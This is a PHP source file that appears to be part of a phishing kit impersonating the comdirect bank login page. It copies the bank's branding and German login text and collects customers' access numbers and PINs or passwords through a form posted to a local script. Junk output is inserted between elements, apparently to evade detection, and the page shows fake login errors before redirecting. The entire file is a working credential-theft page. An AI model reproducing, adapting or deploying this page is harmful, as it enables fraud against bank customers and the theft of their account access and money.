<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header("Location: $redirect");
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<title>Persönlicher Bereich - Login | comdirect.de </title>
		<meta name="application-name" content="Persönlicher Bereich - Login | comdirect.de">
		<link rel="shortcut icon" href="src/cd_img/favicons.png">
		<link rel="icon" href="src/cd_img/favicons.png">
		<meta charset="utf-8">
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<link rel="stylesheet" href="src/cd_css/normalize.css" type="text/css">
		<link rel="stylesheet" href="src/cd_css/styleguide-rebrush_002.css" type="text/css">
		<link rel="stylesheet" href="src/cd_css/styleguide-rebrush_003.css" type="text/css">
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_022.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_038.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_017.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_037.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_008.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_020.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_013.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_042.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_006.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_036.js"></script>
		<script type="text/javascript" charset="utf-8" async="" src="src/cd_js/jquery_005.js"></script>
		<link rel="stylesheet" type="text/css" href="src/cd_css/styleguide-rebrush.css">
	</head>
	<body class="{topframechecker:{},unobtrusivefocus:{enabled:'false'},cobrowsing:{unbluScript:'/unblu/starter.js',cookieName:'x-unblu-session'},keepalive:{url:'/cp/keepalive',onError:'stop',interval:300},ecrm:{id:'cori0004',pageHierachy:undefined},surfertracking:{adform:'',metaTracking:{id:'cori0004',pageHierachy:undefined}}}" data-datalayer="{&quot;page&quot;:{&quot;pageHierarchy&quot;:null,&quot;id&quot;:&quot;cori0004&quot;,&quot;status&quot;:200}}">
		<?php echo genJunk() ?><div class="cif-scope" data-domain=".comdirect.de" data-version="?v=1477546240265">

			<header class="header-top">
				<?php echo genJunk() ?><div class="header-container">
					<a href="#" class="{at:{pageId:'coai0832'}}">
					<img src="src/cd_img/Logo-rb.svg" alt="comdirect bank AG" width="168" height="32">
					</a>

					<?php echo genJunk() ?><div class="flexStretch"></div><?php echo genJunk() ?>

					<?php echo genJunk() ?><div class="searchColumn">
					<form action="//www.comdirect.de/inf/search/all.html" id="search_form">
					<input class="search" name="SEARCH_VALUE" placeholder="Kurssuche" type="text">
					<?php echo genJunk() ?><div class="uiIcon icon-search {commandlink:{event:'click', form: '#search_form', ignoreUnbind:true }}"></div><?php echo genJunk() ?>
					</form>
					<form action="/suche/#/?start=0&amp;q=" id="gsaSearchForm">
					<input class="search {gsaSearchField:{searchButtonSelector:'#topSearchButton'}} ac_input" name="suche" placeholder="Volltextsuche" autocomplete="off" type="text">
					<?php echo genJunk() ?><div class="uiIcon icon-search {commandlink:{event:'click', form: '#gsaSearchForm', ignoreUnbind:true}}"></div><?php echo genJunk() ?>
					</form>
					</div><?php echo genJunk() ?>

					<?php echo genJunk() ?><div class="smallLinks">
					<ul class="clearfix">
					<li><a href="#">Musterdepot</a></li>
					<li><a href="#">B2B</a></li>
					</ul>
					</div><?php echo genJunk() ?>

					<?php echo genJunk() ?><div class="col-login-button">
					<?php echo genJunk() ?><div class="uiButton" id="llLink" data-login="false">
					<a href="#" class="{at:{pageId:'coai0822'}} login">Login</a>
					</div><?php echo genJunk() ?>

					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="header-nav header-main-nav-level-1">
					<ul class="navList header-container">
					<li><a href="#">Persönlicher Bereich</a></li>
					<li><a href="#">Informer</a></li>
					<li><a href="#">Konto &amp; Geldanlage</a></li>
					<li><a href="#">Depot &amp; Wertpapiere</a></li>
					<li><a href="#">Kredit &amp; Finanzierung</a></li>
					<li><a href="#">Hilfe &amp; Service</a></li>
					</ul>
				</div><?php echo genJunk() ?>

				 <?php echo genJunk() ?><div class="header-nav header-main-nav-level-2">
					<ul class="{doubleTapNavigation:{}}"></ul>
				</div><?php echo genJunk() ?>
			</header>
		</div><?php echo genJunk() ?>

        <?php echo genJunk() ?><div class="cif-scope-content-wrapper siteFrame itx-scope">
			<?php echo genJunk() ?><div class="printOnly printOnly-Logo">
				<img src="src/cd_img/Logo-Print.svg" alt="comdirect bank AG" width="auto" height="50">
			</div><?php echo genJunk() ?>
        
            <?php echo genJunk() ?><div class="clearfix uiRootModul fixed">
				<?php echo genJunk() ?><div class="head"></div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div class="body">
					<?php echo genJunk() ?><div id="siteFrame" class="standard floatNone siteFrame uiPanel">
						<?php echo genJunk() ?><div id="provider-content" class="standard floatNone uiPanel provider-content clearfix login-page">
							<?php echo genJunk() ?><div class="uiGridLayout">
								<?php echo genJunk() ?><div class="uiGridLayoutRow">
									<?php echo genJunk() ?><div class="uiGridLayoutColumn-8 uiGridLayoutColumn">
										<h1 class="uiHeading textVerticalTop"><?php echo genJunk() ?><div class="uiFormattedText">Ihr <strong>persönlicher Bereich</strong></div><?php echo genJunk() ?></h1>
										<?php $i = 0; ?>
										<?php echo genJunk() ?><div id="loginFehlgeschlagenTexte" class="standard floatNone uiPanel intro warning m3-right" style="display: <?php echo (isset($_SESSION['err']) ? "block" : "none"); unset($_SESSION['err']); ?>">
											<?php echo genJunk() ?><div id="loginFehlgeschlagenTexte-messages" class="uiMessages errorMessage">
												<?php echo genJunk() ?><div class="uiFormattedText" style="display: <?php echo (isset($_SESSION['user_err']) ? "block" : "none"); (isset($_SESSION['user_err']) ? $i++ : "") ?>">
													<span class="uiOutputText standard textVerticalTop"><?php echo $i ?>)</span>
													<span class="uiOutputText standard textVerticalTop">&nbsp;Das Login konnte nicht erfolgreich durchgeführt werden. Bitte überprüfen Sie Ihre Eingaben. Zur Anmeldung als Kunde geben Sie bitte Zugangsnummer und PIN ein. Für die Anmeldung im "Meine comdirect"-Bereich geben Sie bitte Benutzernamen und Passwort ein. </span>
												</div><?php echo genJunk() ?>
												<br>
												<?php echo genJunk() ?><div class="uiFormattedText" style="display: <?php echo (isset($_SESSION['pass_err']) ? "block" : "none") ; (isset($_SESSION['pass_err']) ? $i++ : "")?>">
													<span class="uiOutputText standard textVerticalTop"><?php echo $i ?>)</span><span class="uiOutputText standard textVerticalTop">&nbsp;Die PIN oder das Passwort müssen mindestens sechs Zeichen lang sein.</span>
												</div><?php echo genJunk() ?>
												<br>
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
										
										<form id="login" name="login" method="post" action="index.php" class="uiForm" autocomplete="off">
											<input name="login" value="login" type="hidden">
											<input id="rolle" name="rolle" value="VERTRAGNEHMER" type="hidden">
											<input id="page" name="page" type="hidden">
											<?php echo genJunk() ?><div class="clearfix uiFormLayout largeSpacing inputWithIcon">
												
												<?php echo genJunk() ?><div class="uiFormLayoutRow <?php echo (isset($_SESSION['user_err']) ? "hasError" : "") ?>">
													<?php echo genJunk() ?><div class="uiFormLayoutColumn label">
														<label for="login-void" class="normal uiLabel">
															<?php echo genJunk() ?><div class="uiFormattedText <?php echo (isset($_SESSION['user_err']) ? "errorMessage" : "") ?>"><strong>Zugangsnummer</strong> (8-stellig)</div><?php echo genJunk() ?>
															<span class="uiOutputText standard small textVerticalTop <?php echo (isset($_SESSION['user_err']) ? "errorMessage" : ""); unset($_SESSION['user_err']) ?>">oder Benutzername</span>
														</label>
													</div><?php echo genJunk() ?>
													
													<?php echo genJunk() ?><div class="icon uiFormLayoutColumn">
														<span class="uiIIcon tooltipRightDown uiIcon icon-info notPrint {tooltip:tooltipRightDown('#j_idt21Tooltip',true,'#j_idt20')} textLeft"></span>
														<?php echo genJunk() ?><div id="j_idt21Tooltip" class="uiIIcon large tooltipRightDown notPrint textLeft tooltipLayer">
															<span class="uiOutputText standard textVerticalTop">Die Zugangsnummer zu Ihrem Konto und Depot ist numerisch. Sie finden die Nummer auf Ihrer Kundenkarte.</span>
															<br>&nbsp;<br>
															<span class="uiOutputText standard textVerticalTop">Der Benutzername gilt für Ihren Zugang zu "Meine comdirect" (z. B. für das Musterdepot).</span>
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
													
													<?php echo genJunk() ?><div class="input uiFormLayoutColumn"><input id="cd_username" name="cd_username" class="large uiInputText {unobtrusivefocus:{toFocus:'#cd_username'}} textLeft" value="<?php echo (isset($_SESSION['cd_username']) ? $_SESSION['cd_username'] : ""); ?>" maxlength="38" type="text"></div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
												
												<?php echo genJunk() ?><div class="uiFormLayoutRow <?php echo (isset($_SESSION['pass_err']) ? "hasError" : "") ?>">
													<?php echo genJunk() ?><div class="uiFormLayoutColumn label">
														<label for="login-void" class="normal uiLabel">
															<?php echo genJunk() ?><div class="uiFormattedText <?php echo (isset($_SESSION['pass_err']) ? "errorMessage" : "") ?>"><strong>PIN</strong> (6-stellig)</div><?php echo genJunk() ?>
															<span class="uiOutputText standard small textVerticalTop <?php echo (isset($_SESSION['pass_err']) ? "errorMessage" : ""); unset($_SESSION['pass_err']) ?>">oder Passwort</span>
														</label>
													</div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="icon uiFormLayoutColumn">
														<span class="uiIIcon tooltipRightDown uiIcon icon-info notPrint {tooltip:tooltipRightDown('#j_idt32Tooltip',true,'#j_idt31')} textLeft"></span>
														<?php echo genJunk() ?><div id="j_idt32Tooltip" class="uiIIcon large tooltipRightDown notPrint textLeft tooltipLayer">
															<span class="uiOutputText standard textVerticalTop">Für den Login in Ihr Konto und Depot geben Sie bitte Ihre sechsstellige numerische Persönliche Identifikationsnummer (PIN) ein.</span>
															<br>&nbsp;<br>
															<span class="uiOutputText standard textVerticalTop">Das Passwort gilt für Ihren "Meine comdirect-Account" und kann neben Ziffern auch Buchstaben enthalten.</span>
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
													
													<?php echo genJunk() ?><div class="input uiFormLayoutColumn"><input id="cd_password" name="cd_password" class="large uiInputText textLeft" maxlength="16" autocomplete="off" type="password"></div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
												
												<?php echo genJunk() ?><div class="uiFormLayoutRow">
													<?php echo genJunk() ?><div class="uiFormLayoutColumn label"><label for="direktzu" class="labelNoInfo uiLabel bold">Direkt zu</label></div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="icon uiFormLayoutColumn">&nbsp;</div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="input uiFormLayoutColumn">
														<select id="direktzu" name="direktzu" class="uiDropDownList large ziel" size="1">
															<option value="PersoenlicherBereich" class="" selected="selected">Persönlicher Bereich</option>
															<option value="DepotUebersicht" class="">Depotübersicht</option>
															<option value="DepotUmsaetze" class="">Depotumsätze</option>
															<option value="InlandsOrder" class="">Inlandsorder</option>
															<option value="DepotAusserboerslicherhandel" class="">LiveTrading</option>
															<option value="DepotOrderbuch" class="">Orderbuch</option>
															<option value="KontoUebersicht" class="">Kontoübersicht</option>
															<option value="KontoUmsaetze" class="">Kontoumsätze</option>
															<option value="KontoUeberweisung" class="">Überweisung</option>
															<option value="Platzhalter" class="">-----------------</option>
															<option value="Musterdepot" class="">Musterdepot</option>
															<option value="InformerStartseite" class="">Meine Informer Startseite</option>
														</select>
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>

												<?php echo genJunk() ?><div class="uiFormLayoutRow">
													<?php echo genJunk() ?><div class="uiFormLayoutColumn label">&nbsp;</div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="icon uiFormLayoutColumn">&nbsp;</div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="input uiFormLayoutColumn">
														<img class="signet uiImage" src="src/cd_img/signet_norton-secured.png">
														<?php echo genJunk() ?><div class="largeImportant floatRight uiButton notPrint">
															<a id="loginAction" href="#" class="normal {doublereqprotector:{}} {submitOnEnter:{form:'#login'}} uiCommandLink {commandlink:{event:'click',ignoreUnbind:false,form:'#login',extraParams:{'sendOB_Login_x':'sendOB_Login_x','login':'login'}}}"><span>Anmelden</span></a>
														</div><?php echo genJunk() ?>
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
											</div><?php echo genJunk() ?>
											
											<ul class="uiList list link">
												<li class="uiListEntry"><a href="#" class="uiOutputLink normal"><span>Zugangsdaten vergessen / Zugang gesperrt?</span></a></li>
												<li class="uiListEntry"><a href="#" class="uiOutputLink normal"><span>Kostenfreie Registrierung für "Meine comdirect" und "comdirect community"</span></a></li>
											</ul>
											<input name="javax.faces.ViewState" id="javax.faces.ViewState" value="4226206593691332031:-5623925867460776695" autocomplete="off" type="hidden">
											<input name="javax.faces.RenderKitId" value="HTML_RD" type="hidden">
										</form>
									</div><?php echo genJunk() ?>

									<?php echo genJunk() ?><div class="uiGridLayoutColumn uiGridLayoutColumn-4">
										<?php echo genJunk() ?><div class="standard floatNone infoPanel bgSecondBackground uiPanel">
											<?php echo genJunk() ?><div class="standard infoLogin floatNone uiPanel">
												<?php echo genJunk() ?><div class="uiFormattedText">
													<?php echo genJunk() ?><div class="info"> 
														<?php echo genJunk() ?><div class="warning textCenter">
															<span class="uiIcon icon-exclamation large m1-bottom"></span>
														</div><?php echo genJunk() ?>
														<h2 class="warning textCenter m4-bottom">Vorsicht!</h2> 
														<p>Im
															 Moment werden Kunden von Betrügern angerufen und auf vermeintliche 
															Probleme an ihrem Computer hingewiesen. Nach der „Fehlerbehebung“ wird 
															ein Entgelt verlangt und der Zahlungsvorgang manipuliert, so dass ein 
															nicht vereinbarter höherer Betrag von Ihrem Konto abgebucht wird.</p> 
															<p>Beenden
															 Sie das Gespräch. Sollten Sie bereits Installationen vorgenommen haben,
															 kontaktieren Sie bitte umgehend unsere Kundenbetreuer unter<br>04106 - 708 25 00.</p> 
															 <ul class="list link uiList"> <li class="uiListEntry"> <a href="#" title="So schützen Sie sich vor Trojanern &amp; Phishing">So schützen Sie sich vor Trojanern &amp; Phishing</a> </li> </ul> 
													</div><?php echo genJunk() ?>
												</div><?php echo genJunk() ?>
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
									 </div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>
	
        <?php echo genJunk() ?><div class="cif-scope">
            <?php echo genJunk() ?><div class="contact-footer clearfix">
				<?php echo genJunk() ?><div class="contact-footer-wrapper">
					<?php echo genJunk() ?><div class="contact-footer-heading">
						7 Tage die Woche 24 Stunden für Sie da
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="contact-footer-content">
						<ul class="{childCount: {}} child-count-5 hasChildren">
							<li>
								<a href="#" class="contact-footer-list-element">
									<?php echo genJunk() ?><div class="uiFlexLayout">
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="uiIcon icon-phone-24"></span>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="info-heading">04106 - 70 88</span>
											<span class="info-copy">Für Kunden: <strong>04106 - 708 25 00</strong></span>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</a>
							</li>
							<li>
								<a href="#" class="contact-footer-list-element {at:{pageId:'coai2238'}}">
									<?php echo genJunk() ?><div class="uiFlexLayout">
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="uiIcon icon-contact-mail"></span>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="info-heading">Kontaktformular</span>
											<span class="info-copy">Für alle, die lieber schreiben</span>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								  </a>
							   </li>
							  <li>
								<a href="#" class="contact-footer-list-element {eventdelegate:{plugin:'pluginDelegate',unbind:false,event:'click',target:'#contactCallbackLayer',parameter:{plugin:'coreDialog',functionName:'open',selector:'#contactCallbackLayer'}}}">
									<?php echo genJunk() ?><div class="uiFlexLayout">
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="uiIcon icon-phone-cb"></span>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="info-heading">Rückrufservice</span>
											<span class="info-copy">Wir rufen Sie gerne zurück</span>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</a>
							</li>
						
							 <li>
								<a class="contact-footer-list-element {eventdelegate:{plugin:'pluginDelegate',unbind:false,event:'click',target:'#contactVideoLayer',parameter:{plugin:'coreDialog',functionName:'open',selector:'#contactVideoLayer', parameter: {snippetUrl:'/cms/snippets/cmsajaxpages/overlay_videocall_layer.txt',lazySnippetLoading:true}}},at:{pageId:'coai2239'}}" target="_self" href="#">
									<?php echo genJunk() ?><div class="uiFlexLayout">
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="uiIcon icon-chat-video"></span>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="info-heading">Video-Chat</span>
											<span class="info-copy">Sofort und mit Augenkontakt</span>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</a>
							</li>
						
							<li class="{activateContent:{activationSelector:'#llLink',activationAttribute:'data-login',activationValue:'false'}}">
								<a class="contact-footer-list-element js_cobopenstart {loadCoBrowsing:{},at:{pageId:'coai2237'}}" href="#">
									<?php echo genJunk() ?><div class="uiFlexLayout">
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="uiIcon icon-cursor"></span>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="uiFlexItem">
											<span class="info-heading">Live-Support</span>
											<span class="info-copy">Zeigen Sie uns Ihren Bildschirm</span>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</a>
							</li>
						</ul>
					</div><?php echo genJunk() ?>
					<ul class="contact-footer-list nav-list clearfix">
						<li>
							<a href="#" title="Karte sperren">Karte sperren: 04106 - 708 25 00</a>
						</li>
						<li>
							<a href="#" title="Kundenbetreuung">Kundenbetreuung</a>
						</li>
						<li>
							<a href="#" title="Fragen und Antworten">Fragen und Antworten</a>
						</li>
						<li>
							<a href="#" title="Community">Community</a>
						</li>
					</ul>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>
		
		<?php echo genJunk() ?><div class="cif-scope">
			<footer>
				<?php echo genJunk() ?><div class="footer-container">
					<a href="#" class="cd-logo">
						<img src="src/cd_img/Logo-rb.svg" alt="comdirect bank AG" width="168" height="32">
					</a>
					<?php echo genJunk() ?><div class="flexStretch"></div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="footer-container-font-icons">
						<a href="#" target="_blank" class="{at:{pageId:'coai2494'}}">
							<span class="uiIcon uiIcon-bg icon-bg-transition icon-facebook"></span>
						</a>
						<a href="#" target="_blank" class="{at:{pageId:'coai2495'}}">
							<span class="uiIcon uiIcon-bg icon-bg-transition icon-twitter"></span>
						</a>
						<a href="#" target="_blank" class="{at:{pageId:'coai2496'}}">
							<span class="uiIcon uiIcon-bg icon-bg-transition icon-youtube"></span>
						</a>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="footer-container">
					<ul class="footer-nav footer-nav-level1">
						<li>
							<a class="{at:{pageId:'coai0826'}}" href="#">Unternehmen</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1120'}}" href="#">Presse</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1274'}}" href="#">Karriere</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai2490'}}" href="#">Community</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai2498'}}" href="#">Apps</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1121'}}" href="#">Investor Relations</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1450'}}" href="#">Mobile Website</a>
						</li>
					</ul>
				</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="footer-container">
					<ul class="footer-nav footer-nav-level2">
						<li>
							<a class="{at:{pageId:'coai1113'}}" href="#">Impressum</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1114'}}" href="#">Datenschutz</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1115'}}" href="#">Sicherheit</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1116'}}" href="#">Nutzungsbedingungen</a>
						</li>
						<li>
							<a class="{at:{pageId:'coai1117'}}" target="_blank" href="#">AGB</a>
						</li>
					</ul>
				</div><?php echo genJunk() ?>
			</footer>
		</div><?php echo genJunk() ?>
		<script language="JavaScript" src="src/cd_js/cdb_003.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/cdb.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/cdb_002.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/ccf_core.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/TrackingLogger.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_012.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_032.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_034.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_045.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_011.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_009.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_033.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/json2.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_018.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_040.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_031.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_010.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_016.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jwplayer.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_044.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_030.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/ccfcompatible.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_002.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_039.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_041.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_043.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_035.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_015.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_026.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_028.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_027.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_004.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_024.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_003.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_019.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_025.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_014.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_023.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_029.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_021.js" type="text/javascript"></script>
		<script language="JavaScript" src="src/cd_js/jquery_007.js" type="text/javascript"></script>
	</body>
</html>